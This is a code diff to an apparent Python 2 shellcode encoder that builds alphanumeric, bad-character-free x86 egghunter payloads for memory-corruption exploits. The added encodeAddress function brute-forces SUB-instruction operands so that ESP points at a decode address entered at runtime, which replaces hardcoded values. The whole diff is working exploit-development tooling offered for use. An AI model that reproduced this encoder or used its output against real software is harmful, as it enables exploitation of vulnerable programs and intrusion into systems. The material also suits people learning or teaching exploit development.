@@ -43,6 +43,20 @@ allChar =[0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a,
           0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc,
           0xfd, 0xfe, 0xff]
 
+alphaNumRange = [0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36,
+                 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x41,
+                 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c,
+                 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
+                 0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62,
+                 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d,
+                 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78,
+                 0x79, 0x7a]
+
+hexAlpha = []
+for value in alphaNumRange:
+    if value not in badChar:
+        hexAlpha.append(hex(value))
+
 #Define usable characters based on bad characters
 goodChar=[]
 for value in allChar:
@@ -309,6 +323,104 @@ def encodeSet8(x):
     print "\"\\x2d" + padAndStrip(d1) + padAndStrip(d2) + padAndStrip(d3) + padAndStrip(d4) + "\""
 
 
+def encodeAddress(x,y):
+    k = str(hex(x))[2:99].strip("L")
+    k = "0" * (8-len(k)) + k
+
+    j = str(hex(y))[2:99].strip("L")
+    j = "0" * (8-len(j)) + j
+
+    #print "starting value is: " + k
+
+    a = (k[0] + k[1]) + (k[2] + k[3]) + (k[4] + k[5]) + (k[6] + k[7])
+    z = (j[0] + j[1]) + (j[2] + j[3]) + (j[4] + j[5]) + (j[6] + j[7])
+
+
+    #print "Organized value (Target address) is: " + a
+    #print "Organized value (Starting address) is: " + z
+
+
+    a1 = a[0:2]
+    a2 = a[2:4]
+    a3 = a[4:6]
+    a4 = a[6:8]
+
+    z1 = z[0:2]
+    z2 = z[2:4]
+    z3 = z[4:6]
+    z4 = z[6:8]
+
+    #print "First byte= " + a1
+    #print "Second byte= " + a2
+    #print "Third byte= " + a3
+    #print "Fourth byte= " + a4
+
+
+    row1 = int('0',16)
+    target1 = int('100',16)+(int(z1,16)-int('1',16))
+    while row1 != target1:
+        try:
+            b1 = choice(hexAlpha)
+            c1 = choice(hexAlpha)
+            d1 = choice(hexAlpha)
+
+            if (int(a1,16) + int(b1,16) + int(c1,16) + int(d1,16) == target1):
+                #print (b1,c1,d1)
+                break
+
+        except:
+            print "Something went wrong for row1"
+
+    row2 = int('0',16)
+    target2 = int('100',16)+(int(z2,16)-int('1',16))
+    while row2 != target2:
+        try:
+            b2 = choice(hexAlpha)
+            c2 = choice(hexAlpha)
+            d2 = choice(hexAlpha)
+
+            if (int(a2,16) + int(b2,16) + int(c2,16) + int(d2,16) == target2):
+                #print (b2,c2,d2)
+                break
+
+        except:
+            print "Something went wrong for row2"
+
+    row3 = int('0',16)
+    target3 = int('100',16)+(int(z3,16)-int('1',16))
+    while row3 != target3:
+        try:
+            b3 = choice(hexAlpha)
+            c3 = choice(hexAlpha)
+            d3 = choice(hexAlpha)
+
+            if (int(a3,16) + int(b3,16) + int(c3,16) + int(d3,16) == target3):
+                #print (b3,c3,d3)
+                break
+
+        except:
+            print "Something went wrong for row3"
+
+    row4 = int('0',16)
+    target4 = int('100',16)+int(z4,16)
+    while row4 != target4:
+        try:
+            b4 = choice(hexAlpha)
+            c4 = choice(hexAlpha)
+            d4 = choice(hexAlpha)
+
+            if (int(a4,16) + int(b4,16) + int(c4,16) + int(d4,16) == target4):
+                #print (b4,c4,d4)
+                break
+
+        except:
+            print "Something went wrong for row4"
+
+    print "\"\\x2d" + padAndStrip(b4) + padAndStrip(b3) + padAndStrip(b2) + padAndStrip(b1) + "\""
+    print "\"\\x2d" + padAndStrip(c4) + padAndStrip(c3) + padAndStrip(c2) + padAndStrip(c1) + "\""
+    print "\"\\x2d" + padAndStrip(d4) + padAndStrip(d3) + padAndStrip(d2) + padAndStrip(d1) + "\""
+
+
 def padAndStrip(byte):
     address = str.format('\\x{:02x}', int(byte,16))
     return address
@@ -330,9 +442,7 @@ def genShellcode():
     print "egghunter = ("
     zeroEax()
     print "\"\\x54\\x58\"\n" #PUSH ESP  POP EAX
-    print "\"\\x2d\\x66\\x4d\\x55\\x55\""   #Add the
-    print "\"\\x2d\\x66\\x4b\\x55\\x55\""   #target address
-    print "\"\\x2d\\x6a\\x50\\x55\\x55\""   #where decoding will start
+    encodeAddress(addy1,addy2)
     print "\"\\x50\"" #PUSH EAX
     print "\"\\x5c\"" #POP ESP
     zeroEax()
@@ -361,4 +471,8 @@ def genShellcode():
     print "\"\\x50\")"
 
 if __name__== "__main__":
+    startAddress = str(raw_input("Enter current ESP address: "))
+    addy2 = int(startAddress, base=16)
+    decodeAddress = str(raw_input("Enter target decode address: "))
+    addy1= int(decodeAddress, base=16)
     genShellcode()
